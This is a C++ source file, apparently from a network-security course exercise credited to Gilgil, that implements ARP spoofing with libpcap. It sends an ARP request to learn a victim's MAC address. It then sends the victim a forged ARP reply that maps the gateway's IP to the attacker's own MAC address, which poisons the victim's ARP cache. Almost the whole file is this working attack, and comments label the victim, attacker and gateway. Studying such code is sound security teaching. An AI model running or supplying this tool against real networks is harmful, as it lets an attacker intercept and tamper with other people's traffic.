// ------------------------------------------------------------
// orignal source : https://gitlab.com/gilgil/send-arp-test
// Author: Gilgil
// Last update: 2020.05.06
// ------------------------------------------------------------
#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "get_my_addr.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax: send-arp-test <interface> <sender ip> <target ip> \n"); // Sender is victim, target is usually gateway 
	printf("sample: send-arp-test wlan0 192.168.10.2 192.168.10.1 \n"); 
}

// packet template
EthArpPacket packet_make(Mac ETH_dmac, Mac ETH_smac, Mac ARP_smac, Mac ARP_tmac, Ip ARP_sip, Ip ARP_tip, int type){ 

	EthArpPacket packet;

	packet.eth_.dmac_ = ETH_dmac;
	packet.eth_.smac_ = ETH_smac;
	packet.eth_.type_ = htons(EthHdr::Arp);

	packet.arp_.hrd_ = htons(ArpHdr::ETHER);
	packet.arp_.pro_ = htons(EthHdr::Ip4);
	packet.arp_.hln_ = Mac::SIZE;
	packet.arp_.pln_ = Ip::SIZE;

	// request = 1 , reply = 2
	if(type == 1)
	{
		packet.arp_.op_ = htons(ArpHdr::Request);
	}
	else if(type == 2)
	{
		packet.arp_.op_ = htons(ArpHdr::Reply);
	}
	else
	{
		printf("Invalid type\n");
		exit(1);
	}

	packet.arp_.smac_ = ARP_smac;
	packet.arp_.sip_ = htonl(ARP_sip);
	packet.arp_.tmac_ = ARP_tmac;
	packet.arp_.tip_ = htonl(ARP_tip);

	return packet;
}

int main(int argc, char* argv[]) {
	// check args
	if (argc != 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); // 1: promiscuous mode, 1: timeout
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}

	// get attacker MAC address
	char my_mac_str[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
	get_my_mac(my_mac_str,dev); // get attacker MAC address
	Mac my_Mac = Mac(my_mac_str); 

	// get attacker IP address
	char my_ip_str[4] = {0x00, 0x00, 0x00, 0x00};
	get_my_ip(my_ip_str,dev); // get attacker IP address
	Ip my_Ip = Ip(my_ip_str);

	// get victim IP address
	Ip senderIp = Ip(argv[2]);  // victim
	// get target ip address
	Ip targetIp = Ip(argv[3]);  // target

	// create arp packet
	EthArpPacket packet; // packet template
	packet = packet_make(Mac("ff:ff:ff:ff:ff:ff"), my_Mac, my_Mac, Mac("00:00:00:00:00:00"), my_Ip, senderIp, 1); // request packet to victim
	// send arp packet 
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	// from pcap-test
	// reply arp packet recv
	EthArpPacket* recvPacket = NULL; // packet template

	while (true) {
		struct pcap_pkthdr *header;
		const u_char *packet;
		int res = pcap_next_ex(handle, &header, &packet);
		if (res == 0) continue;
		if (res == -1 || res == -2)
		{
			printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
			break;
		}

		recvPacket = (struct EthArpPacket*)packet; 
		if(recvPacket->eth_.type_ != htons(EthHdr::Arp))
			continue;  // not arp packet
		if(recvPacket->arp_.op_ != htons(ArpHdr::Reply))
			continue;  // not arp reply packet
		if(recvPacket->arp_.sip_ != htonl(senderIp) )
			continue;  // not arp reply packet from victim

		break;  // arp reply packet from victim

	}

	// create arp packet
	Mac sender_mac = Mac(recvPacket->arp_.smac_); // sender mac address from arp reply 
	packet = packet_make(sender_mac, my_Mac, my_Mac, sender_mac, targetIp, senderIp, 2); // reply packet to target
	// send arp packet
	res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}

	pcap_close(handle);
}
